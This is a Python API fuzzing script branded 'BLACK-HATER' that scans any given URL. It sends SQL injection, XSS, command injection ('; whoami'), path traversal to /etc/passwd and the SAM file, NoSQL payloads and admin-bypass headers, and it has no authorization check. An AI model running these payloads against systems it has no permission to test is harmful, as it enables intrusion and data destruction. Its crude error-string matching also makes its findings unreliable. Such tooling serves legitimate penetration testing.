#!/usr/bin/env python3
"""
API Fuzzer - Automated API fuzzing and testing.
Part of BLACK-HATER cybersecurity skill.

Usage:
    python3 api_fuzzer.py <target-url> -w <wordlist>
    python3 api_fuzzer.py <target-url> --method POST --data '{}'
"""

import os
import sys
import json
import argparse
import itertools
from pathlib import Path
from urllib.parse import urljoin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class APIFuzzer:
    """Automated API fuzzing and vulnerability discovery."""
    
    # Common API vulnerabilities to test
    INJECTION_PAYLOADS = [
        # SQL Injection
        "' OR '1'='1",
        "1' UNION SELECT NULL--",
        "admin'--",
        "1; DROP TABLE users--",
        
        # XSS
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        
        # Command Injection
        "; whoami",
        "| whoami",
        "`whoami`",
        "$(whoami)",
        
        # Path Traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        
        # LDAP Injection
        "*)(objectClass=*",
        "admin)(&)",
        
        # NoSQL Injection
        '{"$gt": ""}',
        '{"$ne": ""}',
        '{"$regex": ".*"}',
    ]
    
    AUTH_BYPASS_PAYLOADS = [
        # JWT manipulation
        '{"alg":"none"}',
        
        # Header injection
        'X-Forwarded-For: 127.0.0.1',
        'X-Real-IP: 127.0.0.1',
        'X-Original-URL: /admin',
        'X-Rewrite-URL: /admin',
        
        # Cookie manipulation
        'session=admin',
        'role=admin',
        'isAdmin=true',
    ]
    
    def __init__(self, target_url: str, wordlist: str = None):
        self.target = target_url
        self.wordlist = wordlist
        self.results = {
            'target': target_url,
            'vulnerabilities': [],
            'endpoints': [],
            'errors': [],
        }
    
    def run(self):
        """Execute full fuzzing."""
        print(f"\n{'='*60}")
        print(f"  BLACK-HATER API Fuzzer")
        print(f"  Target: {self.target}")
        print(f"{'='*60}\n")
        
        if not HAS_REQUESTS:
            print("[ERROR] requests library required. Install with: pip install requests")
            return
        
        self.fuzz_endpoints()
        self.fuzz_injection()
        self.fuzz_auth_bypass()
        self.fuzz_rate_limit()
        self.generate_report()
    
    def fuzz_endpoints(self):
        """Discover and fuzz API endpoints."""
        print("[1/5] Endpoint discovery...")
        
        # Common API paths
        common_paths = [
            '/', '/api', '/api/v1', '/api/v2',
            '/graphql', '/rest', '/swagger',
            '/admin', '/login', '/register',
            '/users', '/user', '/profile',
            '/settings', '/config', '/health',
        ]
        
        found = []
        
        for path in common_paths:
            try:
                response = requests.get(
                    urljoin(self.target, path),
                    timeout=5,
                    allow_redirects=False
                )
                
                if response.status_code < 400:
                    found.append({
                        'path': path,
                        'status': response.status_code,
                        'size': len(response.content)
                    })
                    
                    # Check for interesting responses
                    if 'api' in response.headers.get('content-type', '').lower():
                        print(f"  [!] API endpoint: {path} ({response.status_code})")
                        
            except Exception:
                continue
        
        self.results['endpoints'] = found
        print(f"  [OK] Found {len(found)} endpoints")
    
    def fuzz_injection(self):
        """Test for injection vulnerabilities."""
        print("[2/5] Injection testing...")
        
        vulns_found = []
        
        # Test each endpoint with injection payloads
        for endpoint in self.results['endpoints']:
            path = endpoint['path']
            
            for payload in self.INJECTION_PAYLOADS[:5]:  # Limit for speed
                try:
                    # Test in URL parameter
                    response = requests.get(
                        urljoin(self.target, path),
                        params={'q': payload, 'id': payload, 'search': payload},
                        timeout=5
                    )
                    
                    # Check for error-based injection
                    if any(error in response.text.lower() for error in 
                           ['sql', 'syntax', 'error', 'exception', 'warning']):
                        vulns_found.append({
                            'type': 'SQL_INJECTION',
                            'path': path,
                            'payload': payload,
                            'evidence': response.text[:200]
                        })
                        print(f"  [!] Potential SQL injection in {path}")
                        break
                        
                except Exception:
                    continue
        
        self.results['vulnerabilities'].extend(vulns_found)
        print(f"  [OK] Tested {len(self.results['endpoints'])} endpoints")
    
    def fuzz_auth_bypass(self):
        """Test for authentication bypass."""
        print("[3/5] Authentication bypass testing...")
        
        vulns_found = []
        
        # Test common admin paths
        admin_paths = ['/admin', '/admin/users', '/api/admin', '/api/users']
        
        for path in admin_paths:
            # Test without authentication
            try:
                response = requests.get(
                    urljoin(self.target, path),
                    timeout=5
                )
                
                if response.status_code == 200:
                    vulns_found.append({
                        'type': 'AUTH_BYPASS',
                        'path': path,
                        'payload': 'No auth required',
                        'evidence': f'Status: {response.status_code}'
                    })
                    print(f"  [!] Auth bypass: {path}")
                    
            except Exception:
                continue
            
            # Test with header manipulation
            for header_payload in self.AUTH_BYPASS_PAYLOADS[:3]:
                try:
                    headers = {}
                    if ':' in header_payload:
                        key, value = header_payload.split(':', 1)
                        headers[key.strip()] = value.strip()
                    
                    response = requests.get(
                        urljoin(self.target, path),
                        headers=headers,
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        vulns_found.append({
                            'type': 'AUTH_BYPASS_HEADER',
                            'path': path,
                            'payload': header_payload,
                            'evidence': f'Status: {response.status_code}'
                        })
                        print(f"  [!] Header bypass: {path} with {header_payload}")
                        break
                        
                except Exception:
                    continue
        
        self.results['vulnerabilities'].extend(vulns_found)
    
    def fuzz_rate_limit(self):
        """Test for rate limiting."""
        print("[4/5] Rate limit testing...")
        
        try:
            # Send multiple requests quickly
            responses = []
            for i in range(10):
                response = requests.get(
                    self.target,
                    timeout=5
                )
                responses.append(response.status_code)
            
            # Check if all succeeded (no rate limiting)
            if all(r == 200 for r in responses):
                print("  [!] No rate limiting detected")
                self.results['vulnerabilities'].append({
                    'type': 'NO_RATE_LIMIT',
                    'path': '/',
                    'payload': '10 rapid requests',
                    'evidence': 'All requests succeeded'
                })
            else:
                print("  [OK] Rate limiting appears to be in place")
                
        except Exception as e:
            print(f"  [WARN] Rate limit test failed: {e}")
    
    def generate_report(self):
        """Generate fuzzing report."""
        print(f"\n{'='*60}")
        print("  FUZZING REPORT")
        print(f"{'='*60}\n")
        
        print(f"Target: {self.target}")
        print(f"Endpoints tested: {len(self.results['endpoints'])}")
        print(f"Vulnerabilities found: {len(self.results['vulnerabilities'])}\n")
        
        if self.results['vulnerabilities']:
            print("## Vulnerabilities")
            for vuln in self.results['vulnerabilities']:
                print(f"\n  [{vuln['type']}]")
                print(f"  Path: {vuln['path']}")
                print(f"  Payload: {vuln['payload']}")
                print(f"  Evidence: {vuln['evidence'][:100]}...")
        else:
            print("## No vulnerabilities found")
        
        # Save report
        report_path = Path("fuzzing_report.json")
        with open(report_path, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n[OK] Full report saved to {report_path}")


def main():
    parser = argparse.ArgumentParser(description='BLACK-HATER API Fuzzer')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('-w', '--wordlist', help='Wordlist file')
    parser.add_argument('--method', default='GET', help='HTTP method')
    parser.add_argument('--data', help='Request data (JSON)')
    
    args = parser.parse_args()
    
    fuzzer = APIFuzzer(args.target, args.wordlist)
    fuzzer.run()


if __name__ == '__main__':
    main()
